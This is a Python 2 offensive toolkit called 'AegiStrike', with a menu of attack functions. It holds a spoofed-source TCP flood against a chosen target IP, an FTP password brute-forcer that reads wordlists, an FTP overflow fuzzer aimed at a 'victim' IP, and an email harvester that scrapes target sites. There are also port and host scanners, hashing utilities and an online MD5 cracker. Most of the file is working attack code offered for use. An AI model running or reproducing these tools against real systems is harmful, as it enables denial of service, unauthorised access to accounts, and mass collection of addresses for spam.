#!/usr/bin/python
# -*- coding: ascii -*-
# encoding=utf8 
import os
import collections
import platform
import subprocess
import threading
import socket
import ftplib
import sys
import random
from scapy.all import *
from subprocess import call
import struct
from datetime import datetime
import hashlib
import re
import urllib2
from urllib import *
from random import randint
from re import search, findall

def md5id():
	print((56 * '\033[31m-\033[1;m'))
	print """\033[1;97m   _  _ ___   ___   ___  _  _ ____ ___ ____ ____ 
   |\/| |  \ |___   |__] |  | [__   |  |___ |__/      
   |  | |__/  __/   |__] |__| ___]  |  |___ |  \\ v0.3\033[1;m"""
	print "\t\033[1;32m  Servers Loaded: Alpha, Delta, Gamma\033[1;m"
	print((56 * '\033[31m-\033[1;m'))
	print"This tool is created by somdev bro also known as d3v"
	print"Requires working Internet Connection"
	print
	hashvalue1 = raw_input('\033[97mEnter your MD5 hash: \033[1;m')
	hashvalue = hashvalue1.lower()
	try:
		data = urlencode({"hash":hashvalue,"submit":"Decrypt It!"})
		html = urlopen("http://md5decryption.com", data)
		find = html.read()
		match = search(r"Decrypted Text: </b>[^<]*</font>", find)
		if len(hashvalue) != 32:
			print "\033[1;31m[Error] Invalid MD5 hash\033[1;m"
			exit()
		if match:
			print "\n\033[1;32mHash cracked by Alpha:\033[1;m", match.group().split('b>')[1][:-7]
		else:
			data = urlencode({"md5":hashvalue,"x":"21","y":"8"})
			html = urlopen("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", data)
			find = html.read()
			match = search (r"<span class='middle_title'>Hashed string</span>: [^<]*</div>", find)    
			if match:
				print "\n\033[1;32mHash cracked by Beta:\033[1;m", match.group().split('span')[2][3:-6]
			else:
				url = "http://www.nitrxgen.net/md5db/" + hashvalue
				purl = urlopen(url).read()
				if len(purl) > 0:
					print "\n\033[1;32mHash cracked by Gamma:\033[1;m", purl
		
				else:
					print "\033[1;31mSorry this hash is not present in our database.\033[1;m"
	except len(hashvalue) == 0:
		print "Empty Input"
	
def emailfinder():
	print" _____                 _ _ _____ _           _           "
	print"| ____|_ __ ___   __ _(_) |  ___(_)_ __   __| | ___ _ __ "
	print"|  _| | '_ ` _ \ / _` | | | |_  | | '_ \ / _` |/ _ \ '__|"
	print"| |___| | | | | | (_| | | |  _| | | | | | (_| |  __/ |   "
	print"|_____|_| |_| |_|\__,_|_|_|_|   |_|_| |_|\__,_|\___|_|   "
	print" 				   Written by Shahid Khan"
	print
	try:
		print"Finding Email Addresses please be patient :-)"
		print"Results will be stored in the AegiStrike's folder"
		regex = re.compile(("([a-z0-9!#$%&'*+\/=?^_'{|}~-]+(?:\.[a-z0-9!#$%&'*+\/=?^_'"
							"{|}~-]+)*(@|\sat\s)(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(\.|"
	     					"\sdot\s))+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)"))
		tarurl = open("urls.txt", "r")
		for line in tarurl:
			output = open("emails.txt", "a")
			time.sleep(randint(10, 100))
			try:
				url = urllib2.urlopen(line).read()
				output.write(line)
				emails = re.findall(regex, url)
				for email in emails:
					output.write(email[0]+"\r\n")
					print email[0]
					
			except:
				pass
				print "error"
			output.close()
	except:
			print
			print"Please create urls.txt file in the AegiStrike Folder and put your all target urls on it ex. :- "
			print"https://www.website.com"
			print"https://www.website2.com"
			print"Warning:- Dont forget https://|http:// on the url :-)"
	
	

def Hasher():
	print" _   _           _   _____     _ _        "
	print"| | | | __ _ ___| |_|_   _| __(_) | _____ "
	print"| |_| |/ _` / __| '_ \| || '__| | |/ / _ \ "
	print"|  _  | (_| \__ \ | | | || |  | |   <  __/"
	print"|_| |_|\__,_|___/_| |_|_||_|  |_|_|\_\___|"
	print"		    Written by Shahid Khan"
                                          

	print"Press 1 --> MD5"
	print
	print"Press 2 --> SHA1"
	print
	print"Press 3 --> SHA224"
	print
	print"Press 4 --> SHA256"
	print
	print"Press 5 --> SHA384"
	print
	print"Press 6 --> SHA512"
	print
	ip = raw_input("Please select an algorithm: ")
	print
	if ip == '1':
		print" __  __ ____  ____  _   _           _               "
		print"|  \/  |  _ \| ___|| | | | __ _ ___| |__   ___ _ __ "
		print"| |\/| | | | |___ \| |_| |/ _` / __| '_ \ / _ \ '__|"
		print"| |  | | |_| |___) |  _  | (_| \__ \ | | |  __/ |   "
		print"|_|  |_|____/|____/|_| |_|\__,_|___/_| |_|\___|_|   "
		print" 		              Written by Shahid Khan"
		print
		message = raw_input("Enter the string you would like to hash: ")
		md5 = hashlib.md5(message.encode())
		print"Your Hash is Ready ;-)"
		print (md5.hexdigest())
	elif ip =='2':
		print" ____  _   _    _    _ _   _           _               "
		print"/ ___|| | | |  / \  / | | | | __ _ ___| |__   ___ _ __ "
		print"\___ \| |_| | / _ \ | | |_| |/ _` / __| '_ \ / _ \ '__|"
		print" ___) |  _  |/ ___ \| |  _  | (_| \__ \ | | |  __/ |   "
		print"|____/|_| |_/_/   \_\_|_| |_|\__,_|___/_| |_|\___|_|   "
 		print"				 Written by Shahid Khan"
		print
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha1(message)
		sha1 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha1
	elif ip == '3':
		print" ____  _   _    _    ____  ____  _  _   _   _           _               "
		print"/ ___|| | | |  / \  |___ \|___ \| || | | | | | __ _ ___| |__   ___ _ __ "
		print"\___ \| |_| | / _ \   __) | __) | || |_| |_| |/ _` / __| '_ \ / _ \ '__|"
		print" ___) |  _  |/ ___ \ / __/ / __/|__   _|  _  | (_| \__ \ | | |  __/ |   "
		print"|____/|_| |_/_/   \_\_____|_____|  |_| |_| |_|\__,_|___/_| |_|\___|_|   "
		print"						  Written by Shahid Khan"
		print
                                                                        

		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha224(message)
		sha128 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha128
	elif ip == '4':
		print" ____  _   _    _    ____  ____   __   _   _           _               "
		print"/ ___|| | | |  / \  |___ \| ___| / /_ | | | | __ _ ___| |__   ___ _ __ "
		print"\___ \| |_| | / _ \   __) |___ \| '_ \| |_| |/ _` / __| '_ \ / _ \ '__|"
		print" ___) |  _  |/ ___ \ / __/ ___) | (_) |  _  | (_| \__ \ | | |  __/ |   "
		print"|____/|_| |_/_/   \_\_____|____/ \___/|_| |_|\__,_|___/_| |_|\___|_|   "
		print"						 Written by Shahid Khan"
		print
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha256(message)
		sha256 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha256
	elif ip == '5':
		print" ____  _   _    _    _____  ___  _  _   _   _           _               "
		print"/ ___|| | | |  / \  |___ / ( _ )| || | | | | | __ _ ___| |__   ___ _ __ "
		print"\___ \| |_| | / _ \   |_ \ / _ \| || |_| |_| |/ _` / __| '_ \ / _ \ '__|"
		print" ___) |  _  |/ ___ \ ___) | (_) |__   _|  _  | (_| \__ \ | | |  __/ |   "
		print"|____/|_| |_/_/   \_\____/ \___/   |_| |_| |_|\__,_|___/_| |_|\___|_|   "
		print"						 Written by Shahid Khan"
		print
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha384(message)
		sha384 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha384
	elif ip == '6':
		print" ____  _   _    _    ____  _ ____  _   _           _               "
		print"/ ___|| | | |  / \  | ___|/ |___ \| | | | __ _ ___| |__   ___ _ __ "
		print"\___ \| |_| | / _ \ |___ \| | __) | |_| |/ _` / __| '_ \ / _ \ '__|"
		print" ___) |  _  |/ ___ \ ___) | |/ __/|  _  | (_| \__ \ | | |  __/ |   "
		print"|____/|_| |_/_/   \_\____/|_|_____|_| |_|\__,_|___/_| |_|\___|_|   "
		print"					     Written by Shahid Khan"
		print
		message = raw_input("Enter the string you would like to hash: ")
		sha = hashlib.sha512(message)
		sha512 = sha.hexdigest()
		print"Your Hash is Ready ;-)"
		print sha512


def hashid():
	print" _   _           _     _____                      _   "
	print"| | | | __ _ ___| |__ | ____|_  ___ __   ___ _ __| |_ "
	print"| |_| |/ _` / __| '_ \|  _| \ \/ / '_ \ / _ \ '__| __|"
	print"|  _  | (_| \__ \ | | | |___ >  <| |_) |  __/ |  | |_ "
	print"|_| |_|\__,_|___/_| |_|_____/_/\_\ .__/ \___|_|   \__|"
	print"                                 |_|                  "
	print"				Written by Shahid Khan"
	print
	def hashcheck (hashtype, regexstr, data):
		try:
			valid_hash = re.finditer(regexstr, data)
			result = [match.group(0) for match in valid_hash]
			if result:
				return "This hash matches the format of: " + hashtype
		except: pass
	string_to_check = raw_input('Please enter the hash you wish to check: ')
	hashes = (
	("Blowfish(Eggdrop)", r"^\+[a-zA-Z0-9\/\.]{12}$"),
	("Blowfish(OpenBSD)", r"^\$2a\$[0-9]{0,2}?\$[a-zA-Z0-9\/\.]{53}$"),
	("Blowfish crypt", r"^\$2[axy]{0,1}\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
	("DES(Unix)", r"^.{0,2}[a-zA-Z0-9\/\.]{11}$"),
	("MD5(Unix)", r"^\$1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
	("MD5(APR)", r"^\$apr1\$.{0,8}\$[a-zA-Z0-9\/\.]{22}$"),
	("MD5(MyBB)", r"^[a-fA-F0-9]{32}:[a-z0-9]{8}$"),
	("MD5(ZipMonster)", r"^[a-fA-F0-9]{32}$"),
	("MD5 crypt", r"^\$1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
	("MD5 apache crypt", r"^\$apr1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
	("MD5(Joomla)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16,32}$"),
	("MD5(Wordpress)", r"^\$P\$[a-zA-Z0-9\/\.]{31}$"),
	("MD5(phpBB3)", r"^\$H\$[a-zA-Z0-9\/\.]{31}$"),
	("MD5(Cisco PIX)", r"^[a-zA-Z0-9\/\.]{16}$"),
	("MD5(osCommerce)", r"^[a-fA-F0-9]{32}:[a-zA-Z0-9]{2}$"),
	("MD5(Palshop)", r"^[a-fA-F0-9]{51}$"),
	("MD5(IP.Board)", r"^[a-fA-F0-9]{32}:.{5}$"),
	("MD5(Chap)", r"^[a-fA-F0-9]{32}:[0-9]{32}:[a-fA-F0-9]{2}$"),
	("Juniper Netscreen/SSG (ScreenOS)", r"^[a-zA-Z0-9]{30}:[a-zA-Z0-9]{4,}$"),
	("Fortigate (FortiOS)", r"^[a-fA-F0-9]{47}$"),
	("Minecraft(Authme)", r"^\$sha\$[a-zA-Z0-9]{0,16}\$[a-fA-F0-9]{64}$"),
	("Lotus Domino", r"^\(?[a-zA-Z0-9\+\/]{20}\)?$"),
	("Lineage II C4", r"^0x[a-fA-F0-9]{32}$"),	
	("CRC-96(ZIP)", r"^[a-fA-F0-9]{24}$"),
	("NT crypt", r"^\$3\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
	("Skein-1024", r"^[a-fA-F0-9]{256}$"),
	("RIPEMD-320", r"^[A-Fa-f0-9]{80}$"),
	("EPi hash", r"^0x[A-F0-9]{60}$"),
	("EPiServer 6.x < v4", r"^\$episerver\$\*0\*[a-zA-Z0-9]{22}==\*[a-zA-Z0-9\+]{27}$"),
	("EPiServer 6.x >= v4", r"^\$episerver\$\*1\*[a-zA-Z0-9]{22}==\*[a-zA-Z0-9]{43}$"),
	("Cisco IOS SHA256", r"^[a-zA-Z0-9]{43}$"),
	("SHA-1(Django)", r"^sha1\$.{0,32}\$[a-fA-F0-9]{40}$"),
	("SHA-1 crypt", r"^\$4\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
	("SHA-1(Hex)", r"^[a-fA-F0-9]{40}$"),
	("SHA-1(LDAP) Base64", r"^\{SHA\}[a-zA-Z0-9+/]{27}=$"),
	("SHA-1(LDAP) Base64 + salt", r"^\{SSHA\}[a-zA-Z0-9+/]{28,}[=]{0,3}$"),
	("SHA-512(Drupal)", r"^\$S\$[a-zA-Z0-9\/\.]{52}$"),
	("SHA-512 crypt", r"^\$6\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
	("SHA-256(Django)", r"^sha256\$.{0,32}\$[a-fA-F0-9]{64}$"),
	("SHA-256 crypt", r"^\$5\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{1,}$"),
	("SHA-384(Django)", r"^sha384\$.{0,32}\$[a-fA-F0-9]{96}$"),
	("SHA-256(Unix)", r"^\$5\$.{0,22}\$[a-zA-Z0-9\/\.]{43,69}$"),
	("SHA-512(Unix)", r"^\$6\$.{0,22}\$[a-zA-Z0-9\/\.]{86}$"),
	("SHA-384", r"^[a-fA-F0-9]{96}$"),
	("SHA-512", r"^[a-fA-F0-9]{128}$"),
	("SSHA-1", r"^({SSHA})?[a-zA-Z0-9\+\/]{32,38}?(==)?$"),
	("SSHA-1(Base64)", r"^\{SSHA\}[a-zA-Z0-9]{32,38}?(==)?$"),
	("SSHA-512(Base64)", r"^\{SSHA512\}[a-zA-Z0-9+]{96}$"),
	("Oracle 11g", r"^S:[A-Z0-9]{60}$"),
	("SMF >= v1.1", r"^[a-fA-F0-9]{40}:[0-9]{8}&"),
	("MySQL 5.x", r"^\*[a-f0-9]{40}$"),
	("MySQL 3.x", r"^[a-fA-F0-9]{16}$"),
	("OSX v10.7", r"^[a-fA-F0-9]{136}$"),
	("OSX v10.8", r"^\$ml\$[a-fA-F0-9$]{199}$"),
	("SAM(LM_Hash:NT_Hash)", r"^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$"),
	("MSSQL(2000)", r"^0x0100[a-f0-9]{0,8}?[a-f0-9]{80}$"),
	("MSSQL(2005)", r"^0x0100[a-f0-9]{0,8}?[a-f0-9]{40}$"),
	("MSSQL(2012)", r"^0x02[a-f0-9]{0,10}?[a-f0-9]{128}$"),
	("TIGER-160(HMAC)", r"^[a-f0-9]{40}$"),
	("SHA-256", r"^[a-fA-F0-9]{64}$"),
	("SHA-1(Oracle)", r"^[a-fA-F0-9]{48}$"),
	("SHA-224", r"^[a-fA-F0-9]{56}$"),
	("Adler32", r"^[a-f0-9]{8}$"),
	("CRC-16-CCITT", r"^[a-fA-F0-9]{4}$"),
	("NTLM)", r"^[0-9A-Fa-f]{32}$"),
	)
	counter = 0
	for h in hashes:
		text = hashcheck(h[0], h[1], string_to_check)
		if text is not None:
			counter += 1
			print text
	if counter == 0:
		print "Your input hash did not match anything, sorry!"
		
	


def hostscanner():
	print" _     _            ____       _            _             "
	print"| |   (_)_   _____ |  _ \  ___| |_ ___  ___| |_ ___  _ __ "
	print"| |   | \ \ / / _ \| | | |/ _ \ __/ _ \/ __| __/ _ \| '__|"
	print"| |___| |\ V /  __/| |_| |  __/ ||  __/ (__| || (_) | |   "
	print"|_____|_| \_/ \___||____/ \___|\__\___|\___|\__\___/|_|   "
	print"                                    Written by Shahid Khan"
	print
	net = raw_input("Enter the Network Address: ")
	net1= net.split('.')
	a = '.'
	net2 = net1[0]+a+net1[1]+a+net1[2]+a
	print
	st1 = int(raw_input("Enter the Starting Host Number: "))
	print
	en1 = int(raw_input("Enter the Last Host Number: "))
	print
	en1=en1+1
	oper = platform.system()
	if (oper=="Windows"):
		ping1 = "ping -n 1 "
	elif (oper== "Linux"):
		ping1 = "ping -c 1 "
	else :
		ping1 = "ping -c 1 "
	t1= datetime.now()
	print "Scanning in Progress"
	for ip in xrange(st1,en1):
		addr = net2+str(ip)
		comm = ping1+addr
		response = os.popen(comm)
		for line in response.readlines():
			if(line.count("TTL")):
				break
			if (line.count("ttl")):
				print addr, "--> Actively Running On Your Network"
	t2= datetime.now()
	total =t2-t1
	print
	print "scanning complete in " , total
		
	


def ddossingle():
	print" ____  _             _      ____       ____            "
	print"/ ___|(_)_ __   __ _| | ___|  _ \  ___/ ___|  ___ _ __ "
	print"\___ \| | '_ \ / _` | |/ _ \ | | |/ _ \___ \ / _ \ '__|"
	print" ___) | | | | | (_| | |  __/ |_| | (_) |__) |  __/ |   "
	print"|____/|_|_| |_|\__, |_|\___|____/ \___/____/ \___|_|   "
	print"               |___/             Written by Shahid Khan"

	print
	src = raw_input("Enter the Source IP: ")
	print
	target = raw_input("Enter the Target IP: ")
	print
	srcport = int(raw_input("Enter the Source Port: "))
	print
	i=1
	while True:
		IP1 = IP(src=src, dst=target)
		TCP1 = TCP(sport=srcport, dport=80)
		pkt = IP1 / TCP1
		send(pkt,inter= .001)
		print "packet sent ", i
		i=i+1	

def ddosdetection():
	print" ____  ____       ____  ____       _            _             "
	print"|  _ \|  _ \  ___/ ___||  _ \  ___| |_ ___  ___| |_ ___  _ __ "
	print"| | | | | | |/ _ \___ \| | | |/ _ \ __/ _ \/ __| __/ _ \| '__|"
	print"| |_| | |_| | (_) |__) | |_| |  __/ ||  __/ (__| || (_) | |   "
	print"|____/|____/ \___/____/|____/ \___|\__\___|\___|\__\___/|_|Beta v1.0   "
	print"                                        Written by Shahid Khan"

	
	s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
	dict = {}
	file_txt = open("dos.txt",'a')
	file_txt.writelines("**********")
	t1= str(datetime.now())
	file_txt.writelines(t1)
	file_txt.writelines("**********")
	file_txt.writelines("\n")
	print "Detection Start ......."
	D_val =10
	D_val1 = D_val+10
	while True:
		pkt = s.recvfrom(2048)
		ipheader = pkt[0][14:34]
		ip_hdr = struct.unpack("!8sB3s4s4s",ipheader)
		IP = socket.inet_ntoa(ip_hdr[3])
		print "Source IP", IP
		if dict.has_key(IP):
			dict[IP]=dict[IP]+1
			print dict[IP]
			if(dict[IP]>D_val) and (dict[IP]<D_val1) :
				line = "DDOS Detected "
				file_txt.writelines(line)
				file_txt.writelines(IP)
				file_txt.writelines("\n")
		else:
			dict[IP]=1	

def ddos():
	print" __  __       _ _   _ ____       ____            "
	print"|  \/  |_   _| | |_(_)  _ \  ___/ ___|  ___ _ __ "
	print"| |\/| | | | | | __| | | | |/ _ \___ \ / _ \ '__|"
	print"| |  | | |_| | | |_| | |_| | (_) |__) |  __/ |   "
	print"|_|  |_|\__,_|_|\__|_|____/ \___/____/ \___|_|   "
	print"                           Written by Shahid Khan"                                                

	target = raw_input("Enter the Target IP: ")
	i=1
	while True:
		a = str(random.randint(1,254))
		b = str(random.randint(1,254))
		c = str(random.randint(1,254))
		d = str(random.randint(1,254))
		dot = "."
		src = a+dot+b+dot+c+dot+d
		print src
		st = random.randint(1,1000)
		en = random.randint(1000,65535)
		loop_break = 0
		for srcport in range(st,en):
			IP1 = IP(src=src, dst=target)
			TCP1 = TCP(sport=srcport, dport=80)
			pkt = IP1 / TCP1
			send(pkt,inter= .0001)
			print "packet sent ", i
			loop_break = loop_break+1
			i=i+1
			if loop_break ==50 :
				break

def fuzfile():
	print" _____                    _______ _       ____               ___            "
	print"|  ___|_   __________   _|  ___(_) | ___ / ___|_ __ ___  __ _| |_ ___  _ __ "
	print"| |_ | | | |_  /_  / | | | |_  | | |/ _ \ |   | '__/ _ \/ _` | __/ _ \| '__|"
	print"|  _|| |_| |/ / / /| |_| |  _| | | |  __/ |___| | |  __/ (_| | || (_) | |   "
	print"|_|   \__,_/___/___|\__, |_|   |_|_|\___|\____|_|  \___|\__,_|\__\___/|_|   "
	print"                    |___/                            Written by Shahid Khan "
	print
	filename = raw_input('Please enter the filename with extention "ex. :- filename.wav": ')
	print""
	fuzzer = raw_input('Please enter bytes to write on the file "ex. :- 1000, 5000, 10000 ": ')
	fuzz = "A" * int(fuzzer)
	
	filewriter = open(filename, 'w')
	filewriter.write(fuzz)
	filewriter.close()
	print""
	print filename + " successfully created with the " + str(fuzzer) + " Garbage strings :-) Best of luck ;-)"
	
	
def fuzzer():
	print" _____                    _____                       "
	print"|  ___|   _ _________   _|  ___|   _ ___________ _ __ "
	print"| |_ | | | |_  /_  / | | | |_ | | | |_  /_  / _ \ '__|"
	print"|  _|| |_| |/ / / /| |_| |  _|| |_| |/ / / /  __/ |   "
	print"|_|   \__,_/___/___|\__, |_|   \__,_/___/___\___|_|   "
	print"                    |___/       Written by Shahid Khan "
	print

	inpt = raw_input('How many bytes you want to send to the victim: ')
	print
	
	fuzz = "A" * int(inpt)
	
	v =raw_input('Please enter the victims ip address: ')
	v1 = v.split('.')
	v2 = '.'
	v3 = v1[0]+v2+v1[1]+v2+v1[2]+v2+v1[3]
	print
	
	cmd = raw_input('Please give the command to fuzz: ')
	print

	
	user = raw_input('Please give the user name to connect: ')
	print
	password = raw_input('Please give the password to continue: ')
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((v3, 21))
	
	s.send('USER ' + user + '\r\n')
	s.recv(1024)
	
	s.send('PASS ' + password + '\r\n')
	s.recv(1024)
	
	s.send (cmd + fuzz + '\r\n')
	s.recv(1024)
	
	s.send('QUIT\r\n')
	
	s.close()
	print
	
	print str(inpt) + " Garbage send to the " + str(v3) + " where username = ", user + " and password = ", password
	print
	print "Now check the FTP server good luck"
	

def portscan():
	print" ____            _         _____          _         "
	print"|  _ \ ___  _ __| |_ _   _|  ___|__  _ __| |_ _   _ "
	print"| |_) / _ \| '__| __| | | | |_ / _ \| '__| __| | | |"
	print"|  __/ (_) | |  | |_| |_| |  _| (_) | |  | |_| |_| |"
	print"|_|   \___/|_|   \__|\__, |_|  \___/|_|   \__|\__, |"
	print"                     |___/                    |___/ "
	print"                              Written by Shahid khan"
	print
	print"This tool will scan your all 65535 ports so It will take time"
	print

	ip = raw_input("Please enter IP to continue: ")
	for p in range(65535):
		s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		r=s.connect_ex((ip, p))
		
		if r==0: 
			print "Port {}:	open".format(p)
			s.close()	
		
def bruteforcer():
	
	print" ____             _    ___  _____           _        "
	print"| __ ) _ __ _   _| |_ / _ \|  ___| __ _   _| |_ ___  "
	print"|  _ \| '__| | | | __| | | | |_ | '__| | | | __/ _ \ "
	print"| |_) | |  | |_| | |_| |_| |  _|| |  | |_| | || (_) |"
	print"|____/|_|   \__,_|\__|\___/|_|  |_|   \__,_|\__\___/ "
	print"                               Written by Shahid Khan" 
	
	
	
	def connect(host,user,password):
		try:
			ftp = ftplib.FTP(host)
			ftp = login(user,password)
			ftp.quit()
			return True
		except:
			return False
		
	def target():
		print
		print "NOTE :- Please Copy your Password text File into the AegiStrike's folder"
		print	
		target = raw_input("Please enter the IP address: ")
		print	
		user = raw_input("Please enter USER name: ")
		print	
		passwordfile = raw_input("Please enter your Password text File name (avilable:password.txt,rockyou.txt) : ")
		print
	    
		print '[+] Using anonymous credentials for ' + target
		if connect(target,'anonymous','anonymous'):
			print '[+] FTP Anonymous log on succeeded on host ' + target
		else:
			print '[-] FTP Anonymous log on failed on host ' + target
		
			passwordread = open(passwordfile, 'r')
		
			for line in passwordread.readlines():
				password = line.strip('\r').strip('\n')
				print "Testing: " + str(password)
		    
				if connect(target,user,password):
		
					print "[+] FTP Logon succeeded on host "+ target + "Username" + user + "Testing: " + password
					exit(0)
				else:
					print "[+] FTP Logon failed"
	target()
def main():
	call ("clear")
	call ("clear")
	print"              />"
	print"             /<"
	print"    O[\\\\\\(O):::<=============================-"         
	print"             \<" 
	print "    _         \>   _ ____  _        _ _        "
	print "   / \   ___  __ _(_) ___|| |_ _ __(_) | _____ "
	print "  / _ \ / _ \/ _` | \___ \| __| '__| | |/ / _ \ "
	print " / ___ \  __/ (_| | |___) | |_| |  | |   <  __/"
	print "/_/   \_\___|\__, |_|____/ \__|_|  |_|_|\_\___|Beta V1.0.2"
	print "             |___/                  Written by Shahid khan "
	print"				Website: www.aegisinet.com"
	print
	print"                             ^"
	print "Press 1	--> Port Scan        | Press 8 --> DoS(Single IP)"
	print"                             |"
	print "Press 2	--> Detect Live Host | Press 9 --> DoS(Multiple IP's)"
	print"                             |"
	print "Press 3	--> Hasher           | Press 10 --> Create a file to Fuzz softwares"
	print"                             |"
	print "Press 4	--> Identify Hash    | Press 11 --> Find Email Address"
	print"                             |"
	print "Press 5	--> Bruteforce       | Press 12 --> MD5 Buster"
	print"                             |"
	print "Press 6	--> FTP Fuzzer       |"
	print"                             |"
	print "Press 7	--> DDoS Detection   |" 
	print"                             |"
	print"<----------------------------------------------------------------------------->"
	print
	inpt = raw_input("Please take an action to continue: ")

	if inpt == "1":
		print
		call ("clear")
		portscan()
		print
		print
	elif inpt == '2':
		print
		call ("clear")
		hostscanner()
		print
		print
	elif inpt == '3':
		print
		call ("clear")
		Hasher()
		print
		print
	elif inpt == '4':
		print
		call ("clear")
		hashid()
		print
		print
	elif inpt == '5':
		print
		call ("clear")
		bruteforcer()
		print
		print
	elif inpt == '6':
		print""
		call ("clear")
		fuzzer()
		print""
		print""
	elif inpt == '7':
		try:
			print""
			call ("clear")
			ddosdetection() 
			print""
			print""
		except:
			print"Try to run as root :-)"
			print""	
	elif inpt == '8':
		try:
			call ("clear")
			ddossingle()
		except:
			print""
			print"Try to run as root :-)"
	
	elif inpt == '9':
		try:
			call ("clear")
			ddos()
		except:
			print""
			print"Try to run as root :-)"
	elif inpt == '10':
		call ("clear")
		fuzfile()
		print
		print
	elif inpt== '11':
		call('clear')
		emailfinder()
		print
		print
	elif inpt == '12':
		call('clear')
		md5id()
		print
		print
		
	con = raw_input("Would you like to continue -> y/n: ")
	if con == 'y':
		main()
	else:
		print"Want to learn hacking :-) www.aegisinet.com"
		print "See you next time :-)"
	
if __name__ == "__main__":
	main()
